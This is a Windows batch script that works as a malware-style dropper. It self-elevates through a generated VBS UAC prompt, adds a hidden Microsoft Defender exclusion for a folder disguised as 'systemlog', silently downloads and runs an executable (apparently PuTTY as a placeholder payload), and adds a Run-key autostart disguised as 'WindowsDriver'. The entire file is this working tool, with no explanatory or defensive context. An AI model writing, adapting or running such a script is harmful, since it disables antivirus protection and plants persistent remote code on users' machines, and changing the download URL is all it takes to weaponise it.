@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

if not exist "C:\Windows\Temp\systemlog" mkdir "C:\Windows\Temp\systemlog"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Temp\systemlog'" >nul 2>&1

timeout /t 3 >nul

set "URL=https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
set "DEST=C:\Windows\Temp\systemlog\putty.exe"

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%' } catch {}" >nul 2>&1

timeout /t 1 >nul

start "" /B "%DEST%"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDriver" /t REG_SZ /d "\"C:\Windows\Temp\systemlog\putty.exe\"" /f >nul 2>&1
pause
